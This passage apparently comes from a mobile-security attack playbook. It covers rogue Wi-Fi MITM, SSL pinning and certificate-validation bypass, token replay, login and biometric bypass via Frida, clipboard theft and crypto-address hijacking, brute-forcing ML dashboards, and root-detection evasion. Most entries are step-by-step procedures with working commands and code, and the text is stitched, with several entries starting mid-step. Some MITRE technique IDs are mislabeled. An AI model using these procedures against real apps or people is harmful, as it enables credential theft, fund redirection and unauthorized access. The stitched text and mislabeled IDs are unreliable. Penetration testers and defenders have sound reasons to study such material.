Step 2: Configure DHCP and NAT routing using dnsmasq or bettercap --caplet http-req-dump. Step 3: Enable packet forwarding and set up iptables to redirect HTTP traffic to mitmproxy or Bettercap. Step 4: From a test Android or iOS device, connect to "Free_Airport_WiFi" (your fake AP). Step 5: On the mobile browser, visit any non-HTTPS website (e.g., internal dev portals, or intentionally insecure demo sites like http://testphp.vulnweb.com). Step 6: In mitmproxy, monitor captured HTTP traffic. If login forms are submitted, intercept credentials in plaintext. Step 7: Modify HTML or JavaScript in transit to insert fake login fields, phishing forms, or payloads. Step 8: Optionally, use SSL stripping to downgrade HTTPS links to HTTP. Step 9: All mobile browser communication is now routed through your proxy, enabling full MITM control. Step 10: Log sensitive data, manipulate sessions, or simulate cookie hijacking for PoC.
- **Detection**: Traffic sniffing, rogue SSID detection, SSL enforcement checks
- **Solution**: Use VPN, enforce HTTPS-only sites, use captive portal validation
- **Tags**: #mitm #mobilebrowser #http #bettercap #wifiattack #phishing

## Frida-Based Runtime MITM Hooking

- **Attack Type**: Man-in-the-Middle (MITM) via Dynamic Hooking
- **Target**: Android Mobile App
- **Vulnerability**: Runtime SSL Pinning, Obfuscated Cert Checks
- **MITRE**: T1557.003: HTTPS MITM
- **Impact**: Full access to HTTPS traffic, bypassed cert validation
- **Tools**: Frida, Frida-server, Android Emulator or rooted device, Burp Suite, Objection, SSL Bypass scripts
- **Scenario**: Some mobile apps use certificate pinning or obfuscation to block MITM proxies. However, attackers can hook runtime functions responsible for certificate validation or data encryption using Frida, allowing real-time MITM interception without modifying the APK.
- **Attack Steps**: Step 1: Launch Burp Suite on your machine and export its CA certificate. Step 2: Set up a rooted Android emulator or device and install Frida-server on it. Run it with adb shell su -c '/data/local/tmp/frida-server &'. Step 3: On your computer, install Frida and Objection via pip. Step 4: Connect your Android device and verify Frida with frida-ps -U. Step 5: Launch the target app and identify its package (e.g., com.example.bankapp). Step 6: Run objection -g com.example.bankapp explore, then run android sslpinning disable. This disables SSL pinning in real-time. Step 7: Set Android proxy settings to point to Burp’s IP and port (e.g., 192.168.1.10:8080). Step 8: In the app, perform login or payment. If the app originally used SSL pinning, Burp will now show HTTPS requests successfully. Step 9: Alternatively, use frida -U -n com.example.bankapp -l universal-ssl-pinning-bypass.js to hook certificate-related Java methods (e.g., checkServerTrusted, verify). Step 10: You have now dynamically bypassed SSL pinning using Frida without modifying the APK, enabling full MITM capability for traffic interception.
- **Detection**: Runtime inspection, Frida trace logs, proxy analysis
- **Solution**: Use strong native SSL pinning, detect runtime tampering, root detection
- **Tags**: #frida #objection #sslpinning #burp #mitm #androidhooking

## App Accepts Self-Signed Certificate

- **Attack Type**: Improper Certificate Validation – MITM
- **Target**: Android/iOS App
- **Vulnerability**: No Cert Validation (Trust All Certificates)
- **MITRE**: T1557.003: HTTPS MITM
- **Impact**: Full interception, login/session hijacking
- **Tools**: Burp Suite, Android Emulator, Self-Signed Cert (via OpenSSL), Wireshark
- **Scenario**: Some Android/iOS apps do not properly validate server certificates. If an app accepts a self-signed certificate without user warning or validation, an attacker can intercept and manipulate HTTPS traffic using a forged certificate, enabling a full MITM attack.
- **Attack Steps**: Step 1: Start Burp Suite and export its CA certificate (cacert.der). Step 2: Convert the certificate to PEM if needed using OpenSSL: openssl x509 -inform DER -in cacert.der -out burp.pem. Step 3: Install the certificate on the Android emulator using adb push burp.pem /sdcard/ and then manually import via settings or copy to /system/etc/security/cacerts with root access. Step 4: Set the proxy in emulator settings to point to Burp’s IP and port. Step 5: Launch the target app and perform sensitive actions (login, fetch data). Step 6: If the app accepts the self-signed Burp certificate, traffic will be decrypted and visible in Burp Proxy. Step 7: Confirm this by observing Host, Authorization, and Set-Cookie headers in Burp. Step 8: For further proof, revoke the self-signed cert in Burp, replace it with a different CN, and repeat the request—if accepted again, the app fully trusts self-signed certs. Step 9: Log results and test on real or rooted device to confirm the same vulnerability exists outside the emulator. Step 10: You have successfully verified that the app accepts a self-signed cert without verification, proving MITM potential.
- **Detection**: Proxy capture with invalid/self-signed cert
- **Solution**: Enforce X.509 chain validation; reject self-signed unless explicitly trusted
- **Tags**: #mobile #selfsigned #burp #mitm #certificate

## App Doesn’t Use Certificate Pinning

- **Attack Type**: Improper Certificate Validation – No SSL Pinning
- **Target**: Android App
- **Vulnerability**: No SSL Pinning
- **MITRE**: T1557.003: HTTPS MITM
- **Impact**: Exposure of login/session tokens, API abuse
- **Tools**: Burp Suite, Android Emulator, Objection, Wireshark
- **Scenario**: When an app doesn't use certificate pinning, it trusts any valid system CA. This allows an attacker with a rogue but valid CA (like Burp’s) to perform a full MITM, intercepting HTTPS traffic without any error.
- **Attack Steps**: Step 1: Launch Burp Suite and export the CA certificate (cacert.der) and install it on the emulator via adb push or import into trusted root store. Step 2: Set proxy settings of the emulator to Burp's IP and port (e.g., 8080). Step 3: Launch the target app and attempt to perform secure actions (login, search, data submission). Step 4: If the app lacks SSL pinning, it will accept the Burp cert and allow HTTPS traffic to be intercepted and viewed in Burp Proxy. Step 5: Inspect traffic and extract tokens, credentials, or any PII visible in requests. Step 6: To confirm absence of pinning, install a Frida script with frida -U -n com.example.app -l ssl_pinning_test.js and observe that no pinning hooks are triggered. Step 7: As a control test, remove Burp’s certificate from the trusted store and repeat—app should fail if pinning is implemented. Step 8: Log test results and compare against security best practices (e.g., Android Network Security Config). Step 9: Document exploitability, noting that any attacker on the same network could MITM with a trusted CA. Step 10: You’ve now successfully demonstrated a MITM due to lack of certificate pinning.
- **Detection**: Certificate inspection, runtime pinning check
- **Solution**: Implement SSL pinning with hash or public key validation
- **Tags**: #mobile #sslpinning #burp #frida #mitm

## App Accepts Expired / Mismatched Certificates

- **Attack Type**: Improper Certificate Validation – Expired/Mismatch Certs
- **Target**: Android App
- **Vulnerability**: Expired or Mismatched Server Certificate Accepted
- **MITRE**: T1557.003: HTTPS MITM
- **Impact**: Intercept encrypted traffic via weak cert checks
- **Tools**: OpenSSL, Burp Suite, Android Emulator, Wireshark
- **Scenario**: If a mobile app does not validate expiry dates or domain names in server certificates, it becomes vulnerable to MITM attacks using expired, revoked, or mismatched certificates.
- **Attack Steps**: Step 1: Create a fake certificate using OpenSSL: openssl req -x509 -nodes -days -365 -newkey rsa:2048 -keyout fake.key -out expired.crt -subj "/CN=fake.example.com" and set -days -365 to backdate the expiry. Step 2: Convert the cert into DER if needed (openssl x509 -outform der -in expired.crt -out expired.der) and import into the device. Step 3: Configure Burp or a custom proxy with this expired certificate. In Burp: go to Proxy > Options > Import cert/key. Step 4: Configure the Android emulator or device to trust the expired certificate. Set device proxy to route through Burp. Step 5: Launch the target app and perform secure actions like login. Step 6: If the app accepts expired certs, the HTTPS handshake will succeed, and you’ll see decrypted traffic in Burp. Step 7: Repeat with a mismatched CN/SAN certificate (/CN=fake.com instead of real domain). If accepted again, app lacks proper hostname validation. Step 8: Use Wireshark or Burp logs to confirm the app continued the TLS handshake. Step 9: Optionally, use Frida to inspect runtime cert validation methods or patch HostnameVerifier logic. Step 10: Document findings and demonstrate the exploit with screenshots or traffic captures. You’ve proven that the app accepts invalid certificates, enabling MITM.
- **Detection**: TLS handshake monitoring, expired cert test
- **Solution**: Enforce cert expiration & domain validation logic
- **Tags**: #certificate #ssl #expired #hostname #mobilemitm

## Custom SSL Implementation with Weak Checks

- **Attack Type**: Improper Certificate Validation – MITM
- **Target**: Android App
- **Vulnerability**: Weak or Custom SSL Certificate Validation Logic
- **MITRE**: T1557.003: HTTPS MITM
- **Impact**: Complete MITM due to poor trust logic
- **Tools**: APKTool, Burp Suite, Android Emulator, JADX, Wireshark
- **Scenario**: Many Android developers override default SSL validation logic and write custom TrustManager or HostnameVerifier classes. If these are weak or empty, any certificate—including a self-signed or expired one—will be accepted, making MITM trivial.
- **Attack Steps**: Step 1: Use apktool d vulnerable.apk to decompile the app and search for custom SSL classes (CustomTrustManager, HostnameVerifier, OkHttpClient.Builder). Step 2: In JADX, look for checkServerTrusted(), verify(), or isTrusted() methods and verify whether they contain empty implementations or always return true. Step 3: If the app uses a custom weak trust manager, set up Burp Suite and export its CA certificate. Step 4: Install the Burp certificate on the Android emulator or real device using adb push and system cert trust store. Step 5: Set the Android proxy settings to point to Burp (e.g., 192.168.1.5:8080). Step 6: Launch the app and perform login or sensitive API calls. Step 7: If Burp shows HTTPS requests without certificate errors, the app accepted your MITM with a custom SSL implementation. Step 8: Try replacing Burp’s certificate with an expired or mismatched cert and see if it still works. If so, validation is likely disabled or broken. Step 9: Optionally patch the APK to log or modify SSL behavior for deeper testing. Step 10: Confirm via proxy logs and static code inspection that the app does not use secure platform TLS validation.
- **Detection**: Static analysis, MITM testing, code review
- **Solution**: Never override default TrustManager unless properly verified; use platform security APIs
- **Tags**: #trustmanager #sslpinning #mitm #androidsecurity #customssl

## Using WebView / Custom Web Clients Without Validation

- **Attack Type**: Improper Certificate Validation – WebView MITM
- **Target**: Android App with WebView
- **Vulnerability**: Improper override of SSL error handling
- **MITRE**: T1557.003: HTTPS MITM
- **Impact**: Full MITM in WebView, phishing or token theft
- **Tools**: Burp Suite, Android Emulator, JADX, APKTool
- **Scenario**: Some mobile apps load external content in WebView without secure HTTPS checks or override SSL errors, allowing MITM using untrusted certificates, leading to session hijacking or phishing via mobile.
- **Attack Steps**: Step 1: Use apktool d and jadx to decompile the APK. Step 2: Search for WebViewClient, shouldOverrideUrlLoading(), or onReceivedSslError() in the source. If you see the method call handler.proceed() inside onReceivedSslError(), it means the app bypasses SSL warnings. Step 3: Set up Burp Suite and export its CA certificate. Install the cert on the Android emulator using adb push and trust it. Step 4: Configure proxy settings on the emulator to Burp's IP and port. Step 5: Launch the app and navigate to a feature using WebView (such as login, profile, or links). Step 6: In Burp, intercept the HTTPS requests. If they load successfully and display content in WebView even when SSL errors are forced (e.g., through self-signed cert or mismatch), the app is insecure. Step 7: Optionally modify responses to inject a fake login or phishing page in the WebView, simulating a credential theft. Step 8: Capture session cookies or tokens. Step 9: Confirm the MITM worked via proxy logs and inspect if the user was warned at any stage (they should be, but weren’t). Step 10: Document the WebView misuse and insecure override behavior.
- **Detection**: Code review, network traffic inspection
- **Solution**: Do not override onReceivedSslError(), use SafeBrowsing APIs, always enforce HTTPS
- **Tags**: #webview #sslerror #android #mitm #certificatebypass

## MITM via Frida/Objection Runtime Patching

- **Attack Type**: Improper Certificate Validation – Runtime Bypass

Step 2: Install the Frida server on the device using adb push and run it via root shell. Step 3: On your attacker machine, install Frida and Objection using pip. Step 4: Connect to the device with objection -g com.target.app explore. Step 5: Inside Objection, run the command android sslpinning disable. This patches known Java SSL methods at runtime. Step 6: Configure device proxy settings to Burp's IP/Port. Step 7: Launch the app and perform secure actions. Step 8: If the app previously used pinning, it should now bypass that check and allow Burp to intercept HTTPS traffic. Step 9: Alternatively, use a Frida script like universal-ssl-pinning-bypass.js and run with frida -U -n com.target.app -l script.js to hook cert validation functions. Step 10: Observe traffic in Burp. You’ve successfully patched the app at runtime without modifying the APK, defeating pinning protections and enabling MITM.

## No App Lock (PIN/Pattern/Fingerprint)

- **Attack Type**: Insecure Authentication – No Device/User Validation
- **Target**: Android App
- **Vulnerability**: Absence of app-level lock even after inactivity or re-entry
- **MITRE**: T1110.001 (Local access without credential prompt)
- **Impact**: Full access to user data if device is stolen or unlocked
- **Tools**: Android Device or Emulator, Lock Screen Disabled, File Manager
- **Scenario**: Many apps store sensitive user data (chats, finances, personal files) without enforcing any form of app-level lock (PIN, biometric, pattern). If the phone is unlocked or stolen, any attacker can open and misuse the app without being challenged to authenticate.
- **Attack Steps**: Step 1: On a test Android device or emulator, install the target app (e.g., banking, chat, or password manager). Step 2: Log in to the app and ensure session is active (do not log out). Step 3: Leave the app running in the background and lock the phone. Step 4: Unlock the device and reopen the app—observe whether any fingerprint/PIN prompt is triggered. Step 5: If the app resumes immediately into the sensitive UI (dashboard, messages, or account), it is not enforcing a secure app-level authentication mechanism. Step 6: Additionally, go to Android Settings > Apps > [Target App] > Clear Recents or open via multitasking to test if biometric is bypassed. Step 7: If available, explore stored content using adb shell or any file explorer to confirm if cached files are accessible without auth. Step 8: Document the impact, especially in shared-device or stolen-device scenarios. Step 9: Test on both real and emulator devices to confirm consistent vulnerability.
- **Detection**: Manual test, session re-entry without prompt
- **Solution**: Implement device-based lock: biometrics, PIN, or OS-based keystore auth
- **Tags**: #insecureauth #applockmissing #androidsecurity

## No Session Timeout / Auto-Logout

- **Attack Type**: Insecure Authentication – Session Hijack Risk
- **Target**: Android App
- **Vulnerability**: Unexpired user sessions on inactivity or screen lock
- **MITRE**: T1531: Account Access Without Login
- **Impact**: Unauthorized access if phone is lost or unattended
- **Tools**: Android Device, ADB Tools, Burp Suite (optional)
- **Scenario**: Applications without session timeouts remain accessible indefinitely, increasing the risk of unauthorized access, especially in stolen/lost device cases.
- **Attack Steps**: Step 1: On a test Android device or emulator, install and log in to the target application using valid credentials. Step 2: After login, navigate to sensitive features like profile, settings, payments, etc. Step 3: Do not manually log out. Simply press Home or switch to another app. Step 4: Leave the app idle for 30+ minutes or lock the screen. Step 5: Reopen the app from the Recents screen or launcher. Step 6: If it resumes the session without any timeout or re-authentication (password, biometric, or PIN), this proves there is no session expiration mechanism. Step 7: Optionally intercept tokens using Burp Suite to verify if session tokens are long-lived without rotation or expiration headers. Step 8: Repeat with airplane mode toggle and confirm session persistence. Step 9: You have now confirmed that the app stores long-lived sessions with no inactivity timeout or auto-logout policy.
- **Detection**: Manual idle test, token inspection in Burp
- **Solution**: Implement inactivity timer + auto logout or re-auth prompt
- **Tags**: #sessiontimeout #mobileauth #androidvuln

## No 2FA (OTP, Email, TOTP)

- **Attack Type**: Authentication Bypass via Lack of MFA
- **Target**: ML Dashboards, Jupyter, Hugging Face, APIs
- **Vulnerability**: No 2FA or OTP requirement in authentication flow
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Full takeover of AI environment, stolen models
- **Tools**: Hydra, Burp Suite, public data breaches
- **Scenario**: AI/ML platforms like JupyterHub, MLFlow, or Hugging Face Spaces often expose public login panels. If the platform only uses username and password without 2FA (two-factor authentication), attackers can easily brute-force or leak credentials and gain full access to training environments, models, and datasets.
- **Attack Steps**: Step 1: Attacker scans for public-facing login portals used by ML tools (e.g., https://ml.mycompany.com, https://jupyter.myorg.ai). These often expose a login screen over HTTP/S with only a username and password field. Step 2: Using automated tools like Hydra, Burp Suite Intruder, or ffuf, the attacker starts brute-forcing credentials using leaked password lists from data breaches (e.g., rockyou.txt, HaveIBeenPwned). Step 3: Once a valid username and password is discovered (e.g., admin:admin123), the attacker logs in successfully because no second authentication step is required. Step 4: Inside the platform, the attacker may see access to running ML jobs, data notebooks, environment variables (with API keys), or terminal shells. Step 5: Attacker may use this to download trained models, manipulate outputs, insert backdoors in code, or even pivot into cloud environments (AWS/GCP credentials often reside in env variables). Step 6: If logging is not properly configured, this access may go completely unnoticed. Step 7: The attacker may persist access by creating new users or saving SSH keys if terminal access is available. Step 8: Since 2FA wasn’t required, a single credential leak from a dev’s laptop or GitHub leak leads to full takeover. Step 9: Defender only realizes breach if user behavior monitoring or audit logs are enabled. Step 10: The entire AI/ML pipeline is now under attacker’s control, without triggering any 2FA alert.
- **Detection**: Monitor login patterns, IP geolocation, failed attempts, and unexpected user logins
- **Solution**: Always enable TOTP/email/OTP-based MFA, enforce strong passwords, and rotate credentials regularly
- **Tags**: Login Security, AI DevOps, Cloud ML, MFA Bypass

## Token Reuse / Replay Attacks

- **Attack Type**: Insecure Authentication – Token Mismanagement
- **Target**: Android/iOS App
- **Vulnerability**: Lack of Token Expiry, Rotation, or Fingerprinting
- **MITRE**: T1550.002: Reuse of Session Tokens
- **Impact**: Account hijack, session cloning, privilege escalation
- **Tools**: Burp Suite, Postman, Android Device, ProxyDroid, ADB
- **Scenario**: Some mobile apps issue long-lived session or access tokens that can be reused without rotation or expiration. Attackers who intercept or extract these tokens can replay them indefinitely from another device or emulator.
- **Attack Steps**: Step 1: Log into the target mobile app and intercept the login response using Burp Suite. Step 2: Look for access tokens, JWTs, or session keys in the Authorization or Set-Cookie headers. Step 3: Copy the token into Postman or Burp Repeater and perform sensitive API requests like profile access or payment history. Step 4: If API responses return valid data, the token is valid outside the app. Step 5: Now lock the device and wait 30 minutes. Then replay the same API request in Postman using the original token. Step 6: If the token still works without expiry, then the app is vulnerable to replay attacks. Step 7: Try sending the same request from another device/emulator using the captured token. If access is still granted, it proves token reuse is possible across devices without revocation. Step 8: If no IP or session fingerprint is required, it confirms the vulnerability is in the server logic accepting tokens blindly. Step 9: Repeat for refresh tokens if used and verify whether they too are long-lived or reusable. Step 10: Document the exact endpoints and how reused tokens grant unauthorized access.
- **Detection**: Token replay via proxy and APIs
- **Solution**: Rotate tokens frequently, bind to IP/device, and set expiration
- **Tags**: #replayattack #tokenreuse #sessiontoken #jwt

## Bypass Login via App Decompilation / Debug

- **Attack Type**: Insecure Authentication – Logic Bypass
- **Target**: Android App
- **Vulnerability**: Local Login Logic Bypass via Static or Runtime Mod
- **MITRE**: T1201: Patch Binary
- **Impact**: Unauthorized app access without real authentication
- **Tools**: JADX, APKTool, Frida, Objection, Android Studio, Emulator
- **Scenario**: Some Android apps implement weak client-side logic that determines whether a user is "logged in" based on local flags (e.g., isLoggedIn = true) or without server validation. Attackers can decompile the APK, patch logic, or force variables at runtime to bypass authentication.
- **Attack Steps**: Step 1: Use apktool d app.apk to decompile the app. Step 2: In the smali or Java code (via JADX), search for methods like login(), isLoggedIn(), or checkCredentials(). Step 3: If the login logic appears to be handled completely on the client side (e.g., comparing username/password locally), you’ve found weak auth implementation. Step 4: Use apktool b to recompile the app after modifying smali code to force the login flag to true (e.g., const/4 v0, 0x1). Step 5: Sign the modified APK using uber-apk-signer or jarsigner and reinstall it on the emulator. Step 6: Launch the app — if it now skips the login screen, you’ve successfully bypassed authentication via static patching. Step 7: Alternatively, use Frida and hook into login validation methods dynamically. Hook the method and force the return value to true, bypassing the server entirely. Step 8: If Objection is used, run objection -g com.target.app explore, then android hooking list classes and hook return true on relevant login functions. Step 9: If access to authenticated areas is granted, it proves the app doesn’t properly validate session state with the server. Step 10: Document this bypass vector and test across app reboots to confirm persistence.
- **Detection**: Static code review + runtime hook + access test
- **Solution**: Always validate login on server-side with secure tokens
- **Tags**: #decompilation #loginbypass #apktool #frida #mobileauth

## Biometric Bypass (Rooted/Jailbroken Devices)

- **Attack Type**: Insecure Authentication – Biometric Bypass
- **Target**: Android/iOS App
- **Vulnerability**: Local Biometric Check Without Server Validation or Integrity Check
- **MITRE**: T1556.002 (Bypass User Authentication)
- **Impact**: Unauthorized access to app features and sensitive data without user biometrics
- **Tools**: Rooted Android Device / Jailbroken iPhone, Frida, Objection, APKTool or FLEX (iOS), adb, Burp Suite (optional)
- **Scenario**: Many mobile applications rely solely on biometric authentication (e.g., fingerprint or FaceID) without fallback verification or device integrity checks. On rooted Android or jailbroken iOS devices, it’s possible to bypass biometric gates via dynamic instrumentation or method hooking tools like Frida or Objection.
- **Attack Steps**: Step 1: Install the target app on a rooted Android or jailbroken iOS device and log in using real credentials to activate biometric authentication. Step 2: Ensure that biometric is required every time the user opens the app (e.g., Face ID/Fingerprint screen appears). Step 3: Use Frida to attach to the running app process using frida -U -n com.target.app. Step 4: List all classes and methods using frida-trace -n com.target.app -m "*authenticate*", *biometric*, or similar keywords depending on the naming convention used. Step 5: Identify the method responsible for returning biometric auth results (e.g., isUserAuthenticated() or onAuthenticationSucceeded()). Step 6: Hook that method using Frida and override the return value with a forced success using send("Bypass"); retval.replace(true); inside your Frida hook script. Step 7: Resume the app and attempt to authenticate—biometric prompt may appear but you’ve overridden the validation, granting full access without real biometric input. Step 8: Alternatively, use Objection: run objection -g com.target.app explore, then execute android hooking watch class on the biometric method and set return_value true. Step 9: On iOS, use FLEX or objection's ios hooking module to achieve similar results. Step 10: If authentication is bypassed and sensitive app functions become available, you’ve proven that biometric checks are client-side only and vulnerable to bypass on compromised devices. Step 11: To confirm the weakness, reboot the device and repeat the test to ensure bypass persists across sessions.
- **Detection**: Manual test on rooted/jailbroken devices with runtime instrumentation
- **Solution**: Enforce biometric via OS-provided secure prompts with server-side fallback checks, detect rooted/jailbroken environments
- **Tags**: #biometricbypass #frida #objection #mobileauth #androidsecurity

## Background App Reads Clipboard (Android < 10)

- **Attack Type**: Clipboard Injection / Leakage
- **Target**: Android App (API < 29)
- **Vulnerability**: Unrestricted Clipboard Access by Background Apps
- **MITRE**: T1056.001: Input Capture – Clipboard Data
- **Impact**: Theft of OTPs, credentials, personal information, and financial data
- **Tools**: Android Emulator (API 28 or below), Android Studio, Malicious App APK (custom built), Logcat, ADB
- **Scenario**: On Android versions prior to 10 (API level < 29), any app running in the background can access the system clipboard without user consent or notification. This allows malicious apps to steal sensitive data like passwords, OTPs, and cryptocurrency wallet addresses copied to the clipboard from other apps.
- **Attack Steps**: Step 1: Open Android Studio and launch an emulator running Android 9 (API level 28) or earlier. You can also use a rooted physical device running Android 9 or below. Step 2: In Android Studio, create a new simple Android app project. Step 3: In MainActivity.java, use the following code to read clipboard data: ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE); ClipData clipData = clipboard.getPrimaryClip(); if (clipData != null) { ClipData.Item item = clipData.getItemAt(0); Log.d("CLIPBOARD", "Clipboard content: " + item.getText()); }. Step 4: Set a timer or service in the app to repeatedly check the clipboard content every 5–10 seconds using Handler or TimerTask. Step 5: Compile and install this app on the emulator or real device using adb install maliciousreader.apk. Step 6: On the same device, open a real app such as a password manager, banking app, or any app where you copy sensitive data like OTPs, usernames, crypto addresses, etc. Step 7: Copy some sensitive information to the clipboard manually. Step 8: Switch back to your malicious app or leave it running in the background. Open adb logcat or view Android Studio’s Logcat and observe that the clipboard content has been captured by the background app. Step 9: Repeat with different apps and data to confirm the vulnerability. Step 10: You have now successfully demonstrated that on Android < 10, any app can access clipboard content in the background without permission or notification to the user.
- **Detection**: Monitor clipboard with background app and log captured content
- **Solution**: Upgrade to Android 10+, restrict clipboard to foreground apps only, use secure input methods
- **Tags**: #clipboardleak #android9 #backgroundapp #otpstealing #infosec

## Malicious Clipboard Injection (Paste Hijack)

- **Attack Type**: Clipboard Injection
- **Target**: Android App (API < 29)
- **Vulnerability**: Clipboard Global Write Access (no permission required)
- **MITRE**: T1115: Clipboard Data Manipulation
- **Impact**: Funds redirection, phishing link injection, credential theft
- **Tools**: Android Studio, Android Emulator (API < 29), Java/Kotlin, adb
- **Scenario**: Malicious apps can overwrite the clipboard contents while running in the background. For example, when a user copies their cryptocurrency address, the app replaces it with an attacker’s address. If the user pastes without verifying, funds or data are hijacked.
- **Attack Steps**: Step 1: Open Android Studio and create a new project for an app named "ClipboardServiceApp". Step 2: In MainActivity.java, request android.permission.FOREGROUND_SERVICE and set up a Service that runs in the background. Step 3: In the Service, use the following code snippet inside a timed loop: ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE); ClipData clip = ClipData.newPlainText("label", "attacker_crypto_wallet_or_phishing_url"); clipboard.setPrimaryClip(clip);. Step 4: Use Handler or TimerTask to repeat this overwrite every few seconds (e.g., every 10 seconds). Step 5: Package and install the app on an Android 9 or lower emulator or rooted device using adb install. Step 6: In a separate window, use a dummy app (or notepad) to copy your real Bitcoin/Ethereum wallet address. Step 7: After copying it, switch apps or wait a few seconds, then paste the content in a chat or note. Step 8: Observe that the pasted content is now the attacker’s address, not what you copied. Step 9: This proves the malicious app silently hijacked the clipboard data before you pasted. Step 10: You’ve now successfully demonstrated clipboard paste hijacking, as apps before Android 10 can manipulate clipboard globally.
- **Detection**: Clipboard comparison, log monitoring
- **Solution**: Use Android 10+ APIs, block clipboard access for background apps, validate pasted data in critical apps
- **Tags**: #clipboardinjection #pastehijack #android9 #phishing #malware

Step 8: This demonstrates that the app is injecting phishing content silently into the clipboard. Step 9: To prove persistence, switch between apps or restart the device and observe the clipboard contents again after relaunching the fake app. Step 10: You’ve now simulated a working clipboard hijack scenario used in phishing and crypto wallet scams.

## Clipboard Over Bluetooth / Airdrop (Leakage Across Devices)

- **Attack Type**: Clipboard Leakage
- **Target**: iPhone + macOS (same iCloud)
- **Vulnerability**: Cross-device clipboard sync without granular control
- **MITRE**: T1115: Clipboard Data

Clipboard content like OTPs or passwords may leak to other linked Apple devices. If one of the paired devices is compromised, the sensitive clipboard data is leaked automatically.

Step 2: On the Mac, enable "Handoff" from System Settings > General > AirDrop & Handoff. Do the same on iPhone in Settings > General > AirPlay & Handoff. Step 3: Open Notes on iPhone and copy any sensitive data like a password, 2FA code, or private key. Step 4: On the Mac, open any app like Notes or Safari and use Command+V to paste. You'll see the clipboard content from your iPhone appears immediately. Step 5: Now simulate an attacker scenario — create a background macOS script that captures clipboard content using pbpaste command in Terminal: while true; do pbpaste >> clipboard_log.txt; sleep 5; done. Step 6: Run this script and observe how all copied content from iPhone is captured silently on the Mac. Step 7: This proves that the iOS clipboard is synced across devices, and any compromised Mac can steal sensitive content from an iPhone without touching it. Step 8: Try copying different content on the iPhone and note that it continues leaking to Mac via Universal Clipboard.
- **Detection**: Monitor clipboard access logs on paired devices
- **Solution**: Disable Handoff, avoid copying sensitive data, use secure in-app fields
- **Tags**: #appleuniversalclipboard #airdropleak #bluetoothclipboard #infosec

## Static String Bypass (APK Decompile + Patch)

- **Attack Type**: Root Detection Bypass
- **Target**: Android App
- **Vulnerability**: Insecure or hardcoded logic for root detection
- **MITRE**: T1621: Root Detection Evasion
- **Impact**: Allows rooted device users to access restricted app features
- **Tools**: jadx, APKTool, Notepad++, Android Studio, Emulator (rooted), adb, zipalign, apksigner
- **Scenario**: Many apps use hardcoded checks to detect root by scanning for strings like "su", "magisk", or "busybox". By decompiling the APK and patching the method that checks for these keywords or their result, you can completely disable root detection.
- **Attack Steps**: Step 1: Download the target APK from your emulator or device using adb pull /data/app/com.example.app/base.apk. Step 2: Use apktool d base.apk to decompile the APK. Step 3: Navigate to the smali/ directory and search for known root checks using grep -r "su" or strings like getRuntime().exec("su"). Step 4: Identify the method that calls su, or any method returning true for a root check (e.g., isDeviceRooted()). Step 5: Open the corresponding .smali file in Notepad++ and modify the method to always return const/4 v0, 0x0 followed by return v0. This forces the method to always return false (not rooted). Step 6: Save the smali file and rebuild the APK using apktool b base -o patched.apk. Step 7: Sign the APK with apksigner sign --ks my-release-key.jks patched.apk. Step 8: Install the patched app using adb install patched.apk. Step 9: Launch the app. You’ll observe that the root detection mechanism is now bypassed, even though the device is rooted.
- **Detection**: Analyze static APK logic and check for modified methods
- **Solution**: Use runtime integrity checks, obfuscate root detection logic
- **Tags**: #apkpatching #rootbypass #androidsmali #apkreverse

## Frida Hook to Override Detection

- **Attack Type**: Root Detection Bypass
- **Target**: Android App
- **Vulnerability**: Runtime root detection logic hookable via Frida
- **MITRE**: T1621: Hooking and Code Injection
- **Impact**: App works even on rooted devices, unauthorized usage of premium features
- **Tools**: Frida, Python, Android Emulator (rooted), adb, Frida-server
- **Scenario**: Android apps often call Java methods or native libraries (e.g., System.getenv, Runtime.getRuntime.exec("su")) to detect root. Frida allows you to hook and override these at runtime without modifying the APK.
- **Attack Steps**: Step 1: Install Frida using pip install frida-tools and set up Frida-server on the target rooted Android device. Step 2: Connect your phone using adb and push Frida server using adb push frida-server /data/local/tmp/. Step 3: Start the server: adb shell, then chmod +x /data/local/tmp/frida-server and ./frida-server &. Step 4: On your PC, create a Frida script hook-root-check.js with the following content: Java.perform(function() { var RootCheck = Java.use("com.example.app.Utils"); RootCheck.isDeviceRooted.implementation = function() { return false; }; });. Replace com.example.app.Utils with the actual class and method from your target app. Step 5: Run frida -U -n com.example.app -l hook-root-check.js to inject the hook into the running app. Step 6: Open the app and navigate to the screen that usually checks for root. You’ll observe that the root detection is bypassed at runtime without modifying the APK. Step 7: You can hook other methods like System.getProperty("ro.build.tags"), exec("su"), or new File("/system/app/Superuser.apk") similarly. Step 8: You’ve now successfully bypassed root detection using Frida.
- **Detection**: Log method returns, check injected Frida scripts
- **Solution**: Use native root checks, anti-Frida techniques, checksum verification
- **Tags**: #frida #runtimehooking #rootbypass #androidpentest

Step 3: In Magisk settings, enable Enforce DenyList. Then tap “Configure DenyList.” Step 4: Browse the list of installed apps and locate the app you want to hide root from (e.g., com.example.bankapp). Expand it and check all components (main app + all activities and services). Step 5: Optionally, use “Magisk Hide Props Config” module to mask system properties like ro.build.tags, ro.debuggable, and ro.secure. You can install this module from the Magisk module repository and follow on-screen CLI steps via adb shell or a terminal emulator app. Step 6: Reboot your device. Launch the target app. You should now observe that the app no longer detects root — it will behave as if the device is non-rooted. Step 7: If the app still detects root, try combining this with “Shamiko” module (Zygisk-compatible) to enhance hiding capabilities. Install via Magisk → Modules → Flash ZIP → Reboot.
- **Detection**: Monitor system properties, check Zygisk activity, and filesystem mounts
- **Solution**: Use SafetyNet + Play Integrity API, perform native root checks, and integrity attestation
- **Tags**: #magisk #zygisk #rootbypass #denylist #mobilepentest

- **Tools**: Frida, frida-server, rooted Android device, adb, APK of target app
- **Scenario**: Many apps refuse to run on rooted/jailbroken devices. This attack disables root checks at runtime using Frida, allowing full access to all app features even on rooted devices.
- **Attack Steps**: Step 1: Install the target app (e.g., com.example.app) on a rooted Android device. Step 2: Push and run frida-server using adb push frida-server /data/local/tmp && adb shell chmod 755 /data/local/tmp/frida-server && ./data/local/tmp/frida-server. Step 3: On your host system, install Frida tools using pip install frida-tools. Step 4: Write a Frida script (bypass-root.js) to hook and override root check functions. For example: Java.perform(function () { var RootUtil = Java.use("com.example.util.RootCheck"); RootUtil.isRooted.implementation = function() { console.log("Bypassing root check..."); return false; }; }); Step 5: Inject the script using frida -U -n com.example.app -l bypass-root.js. Step 6: Open the app and verify that it runs normally even on the rooted device.
- **Detection**: Log-based detection, runtime behavior monitoring
